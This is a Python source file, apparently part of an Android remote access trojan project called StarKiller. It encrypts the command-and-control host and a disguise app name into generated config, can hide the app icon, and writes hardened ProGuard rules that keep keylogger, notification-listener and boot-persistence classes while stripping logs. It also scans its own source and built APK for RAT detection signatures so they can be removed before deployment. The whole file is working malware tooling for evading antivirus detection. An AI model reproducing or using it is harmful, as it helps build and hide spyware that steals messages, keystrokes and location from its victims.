"""
StarKiller Obfuscation Pipeline

1. String encryption — encrypt all config strings so they don't appear in plaintext in the DEX
2. ProGuard hardening — aggressive class/method renaming
3. Manifest cleaning — remove debug flags, sanitize package names
4. YARA signature check — scan for known RAT detection patterns
"""
import base64
import os
import re
import sys
import random
import string
import shutil

KEY = 0x5A

def encrypt_string(plain):
    raw = plain.encode("utf-8")
    out = bytearray(len(raw))
    for i in range(len(raw)):
        out[i] = raw[i] ^ (KEY + i % 7)
    return base64.b64encode(bytes(out)).decode("ascii")


def decrypt_string(encoded):
    raw = base64.b64decode(encoded)
    out = bytearray(len(raw))
    for i in range(len(raw)):
        out[i] = raw[i] ^ (KEY + i % 7)
    return bytes(out).decode("utf-8")


def generate_encrypted_config(host, port, app_name, hide_icon):
    enc_host = encrypt_string(host)
    enc_name = encrypt_string(app_name)

    verify_host = decrypt_string(enc_host)
    verify_name = decrypt_string(enc_name)
    assert verify_host == host, f"Encryption verify failed: {verify_host} != {host}"
    assert verify_name == app_name, f"Encryption verify failed: {verify_name} != {app_name}"

    config = f'''package com.starkiller.agent

object Config {{
    val C2_HOST: String get() = Crypt.d("{enc_host}")
    const val C2_PORT = {port}
    const val RECONNECT_BASE_MS = 5000L
    const val RECONNECT_MAX_MS = 300000L
    const val HEARTBEAT_INTERVAL_MS = 30000L
    val APP_NAME: String get() = Crypt.d("{enc_name}")
    const val HIDE_ICON = {str(hide_icon).lower()}
}}
'''
    return config


def generate_proguard_rules():
    return """-optimizationpasses 5
-allowaccessmodification
-mergeinterfacesaggressively
-overloadaggressively
-repackageclasses ''
-flattenpackagehierarchy ''

# Keep entry points
-keep public class com.starkiller.agent.MainActivity { *; }
-keep public class com.starkiller.agent.StarKillerService { *; }
-keep public class com.starkiller.agent.persistence.BootReceiver { *; }
-keep public class com.starkiller.agent.modules.KeyLogService { *; }
-keep public class com.starkiller.agent.modules.NotifListenerService { *; }

# Obfuscate everything else
-dontwarn javax.**
-dontwarn sun.**

# Remove logging
-assumenosideeffects class android.util.Log {
    public static int v(...);
    public static int d(...);
    public static int i(...);
    public static int w(...);
    public static int e(...);
}
"""


YARA_RULES = r"""
rule AndroidRAT_Strings {
    strings:
        $s1 = "C2_HOST" ascii wide
        $s2 = "C2_PORT" ascii wide
        $s3 = "starkiller" ascii wide nocase
        $s4 = "keylog" ascii wide nocase
        $s5 = "send_sms" ascii wide nocase
        $s6 = "camera_capture" ascii wide nocase
        $s7 = "gps_track" ascii wide nocase
        $s8 = "agent_id" ascii wide
        $s9 = "heartbeat" ascii wide
        $s10 = "task_router" ascii wide nocase
        $s11 = "/sdcard" ascii
        $s12 = "RECEIVE_BOOT_COMPLETED" ascii
        $s13 = "AccessibilityService" ascii
        $s14 = "NotificationListenerService" ascii
        $s15 = "BIND_ACCESSIBILITY_SERVICE" ascii
    condition:
        3 of them
}

rule AndroidRAT_Permissions {
    strings:
        $p1 = "READ_SMS" ascii
        $p2 = "SEND_SMS" ascii
        $p3 = "CAMERA" ascii
        $p4 = "RECORD_AUDIO" ascii
        $p5 = "READ_CONTACTS" ascii
        $p6 = "ACCESS_FINE_LOCATION" ascii
        $p7 = "READ_CALL_LOG" ascii
        $p8 = "RECEIVE_BOOT_COMPLETED" ascii
    condition:
        6 of them
}

rule AndroidRAT_Network {
    strings:
        $n1 = "socket" ascii nocase
        $n2 = "connect" ascii
        $n3 = "sendall" ascii nocase
        $n4 = /\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}/ ascii
        $n5 = "8667" ascii
    condition:
        3 of them
}
"""


def scan_file_for_signatures(filepath):
    """Simple string-based signature scan (doesn't need yara-python)"""
    if not os.path.exists(filepath):
        return []

    with open(filepath, "rb") as f:
        data = f.read()

    findings = []

    rat_strings = [
        (b"C2_HOST", "Config string 'C2_HOST' visible in plaintext"),
        (b"C2_PORT", "Config string 'C2_PORT' visible in plaintext"),
        (b"starkiller", "Project name 'starkiller' visible"),
        (b"StarKiller", "Project name 'StarKiller' visible"),
        (b"keylog", "Keyword 'keylog' visible"),
        (b"heartbeat", "Protocol keyword 'heartbeat' visible"),
        (b"agent_id", "Protocol keyword 'agent_id' visible"),
        (b"task_router", "Class name 'task_router' visible"),
        (b"vader", "VADER reference visible"),
    ]

    for sig, desc in rat_strings:
        if sig in data:
            offset = data.index(sig)
            findings.append({"sig": sig.decode(errors="replace"), "desc": desc, "offset": offset, "severity": "HIGH"})

    ip_pattern = re.compile(rb'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}')
    ips = ip_pattern.findall(data)
    private_ips = [ip for ip in ips if ip.startswith(b"192.168.") or ip.startswith(b"10.") or ip.startswith(b"172.")]
    if private_ips:
        findings.append({"sig": "hardcoded_ip", "desc": f"Hardcoded private IP(s): {[ip.decode() for ip in private_ips[:3]]}", "severity": "HIGH"})

    if b"8667" in data:
        findings.append({"sig": "port_8667", "desc": "C2 port 8667 visible in binary", "severity": "MEDIUM"})

    perm_count = 0
    dangerous_perms = [b"READ_SMS", b"SEND_SMS", b"CAMERA", b"RECORD_AUDIO",
                       b"READ_CONTACTS", b"ACCESS_FINE_LOCATION", b"READ_CALL_LOG"]
    for p in dangerous_perms:
        if p in data:
            perm_count += 1
    if perm_count >= 5:
        findings.append({"sig": "excessive_perms", "desc": f"{perm_count}/7 dangerous permissions requested", "severity": "HIGH"})

    if b"BIND_ACCESSIBILITY_SERVICE" in data and b"BIND_NOTIFICATION_LISTENER_SERVICE" in data:
        findings.append({"sig": "dual_service_abuse", "desc": "Both Accessibility + NotificationListener (common RAT pattern)", "severity": "HIGH"})

    return findings


def scan_directory(path):
    """Scan all files in a directory for RAT signatures"""
    all_findings = {}
    for root, dirs, files in os.walk(path):
        for fname in files:
            fpath = os.path.join(root, fname)
            findings = scan_file_for_signatures(fpath)
            if findings:
                rel = os.path.relpath(fpath, path)
                all_findings[rel] = findings
    return all_findings


def print_scan_report(findings, title="DETECTION SCAN"):
    print(f"\n  {'='*60}")
    print(f"  {title}")
    print(f"  {'='*60}")

    if not findings:
        print(f"  [+] CLEAN — no known signatures detected")
        print(f"  {'='*60}\n")
        return 0

    total = sum(len(v) for v in findings.values())
    high = sum(1 for v in findings.values() for f in v if f["severity"] == "HIGH")
    med = sum(1 for v in findings.values() for f in v if f["severity"] == "MEDIUM")

    for filepath, file_findings in sorted(findings.items()):
        print(f"\n  [{filepath}]")
        for f in file_findings:
            icon = "!!" if f["severity"] == "HIGH" else "! "
            print(f"    [{icon}] {f['desc']}")
            if "offset" in f:
                print(f"         offset: 0x{f['offset']:x}")

    print(f"\n  TOTAL: {total} findings ({high} HIGH, {med} MEDIUM)")
    print(f"  {'='*60}\n")
    return total


def main():
    import argparse
    parser = argparse.ArgumentParser(description="StarKiller obfuscation pipeline")
    sub = parser.add_subparsers(dest="cmd")

    enc = sub.add_parser("encrypt", help="Encrypt a string")
    enc.add_argument("text")

    dec = sub.add_parser("decrypt", help="Decrypt a string")
    dec.add_argument("encoded")

    cfg = sub.add_parser("config", help="Generate encrypted Config.kt")
    cfg.add_argument("--ip", required=True)
    cfg.add_argument("--port", type=int, default=8667)
    cfg.add_argument("--name", default="System Service")
    cfg.add_argument("--hide-icon", action="store_true")

    pro = sub.add_parser("proguard", help="Generate hardened ProGuard rules")

    scn = sub.add_parser("scan", help="Scan files for detection signatures")
    scn.add_argument("path", help="File or directory to scan")

    full = sub.add_parser("full", help="Full pipeline: encrypt config + harden proguard + scan")
    full.add_argument("--ip", required=True)
    full.add_argument("--port", type=int, default=8667)
    full.add_argument("--name", default="System Service")
    full.add_argument("--hide-icon", action="store_true")

    args = parser.parse_args()

    if args.cmd == "encrypt":
        result = encrypt_string(args.text)
        print(f"  plain:     {args.text}")
        print(f"  encrypted: {result}")
        print(f"  verify:    {decrypt_string(result)}")

    elif args.cmd == "decrypt":
        print(f"  decrypted: {decrypt_string(args.encoded)}")

    elif args.cmd == "config":
        config = generate_encrypted_config(args.ip, args.port, args.name, args.hide_icon)
        config_path = os.path.join("client", "app", "src", "main", "kotlin",
                                   "com", "starkiller", "agent", "Config.kt")
        with open(config_path, "w") as f:
            f.write(config)
        print(f"  [+] Encrypted config written to {config_path}")
        print(f"  [+] Host '{args.ip}' encrypted — not visible in DEX")

    elif args.cmd == "proguard":
        rules = generate_proguard_rules()
        rules_path = os.path.join("client", "app", "proguard-rules.pro")
        with open(rules_path, "w") as f:
            f.write(rules)
        print(f"  [+] Hardened ProGuard rules written to {rules_path}")

    elif args.cmd == "scan":
        if os.path.isdir(args.path):
            findings = scan_directory(args.path)
        else:
            findings = {}
            f = scan_file_for_signatures(args.path)
            if f:
                findings[args.path] = f
        print_scan_report(findings)

    elif args.cmd == "full":
        print("\n  STARKILLER OBFUSCATION PIPELINE")
        print("  " + "="*40)

        # Step 1: encrypt config
        config = generate_encrypted_config(args.ip, args.port, args.name, args.hide_icon)
        config_path = os.path.join("client", "app", "src", "main", "kotlin",
                                   "com", "starkiller", "agent", "Config.kt")
        with open(config_path, "w") as f:
            f.write(config)
        print(f"  [1/4] Config encrypted (host={args.ip} -> ciphertext)")

        # Step 2: harden proguard
        rules = generate_proguard_rules()
        rules_path = os.path.join("client", "app", "proguard-rules.pro")
        with open(rules_path, "w") as f:
            f.write(rules)
        print(f"  [2/4] ProGuard hardened (5-pass, repackage, strip logs)")

        # Step 3: scan source for signatures BEFORE build
        print(f"  [3/4] Pre-build signature scan...")
        src_dir = os.path.join("client", "app", "src")
        findings = scan_directory(src_dir)
        count = print_scan_report(findings, "PRE-BUILD SOURCE SCAN")

        if count > 0:
            print(f"  [!] {count} detection signatures found in source")
            print(f"  [!] These will appear in the compiled APK unless fixed")
        else:
            print(f"  [+] Source is clean — no known signatures")

        # Step 4: scan built APK if it exists
        apk_dir = "payloads"
        if os.path.isdir(apk_dir):
            apks = [f for f in os.listdir(apk_dir) if f.endswith(".apk")]
            if apks:
                latest = max(apks, key=lambda x: os.path.getmtime(os.path.join(apk_dir, x)))
                apk_path = os.path.join(apk_dir, latest)
                print(f"  [4/4] Scanning built APK: {latest}")
                apk_findings = scan_file_for_signatures(apk_path)
                if apk_findings:
                    print_scan_report({latest: apk_findings}, "APK BINARY SCAN")
                else:
                    print(f"  [+] APK binary is clean")
            else:
                print(f"  [4/4] No APK found in payloads/ — build first")
        else:
            print(f"  [4/4] No payloads/ dir — build first with build.py")

    else:
        parser.print_help()


if __name__ == "__main__":
    main()
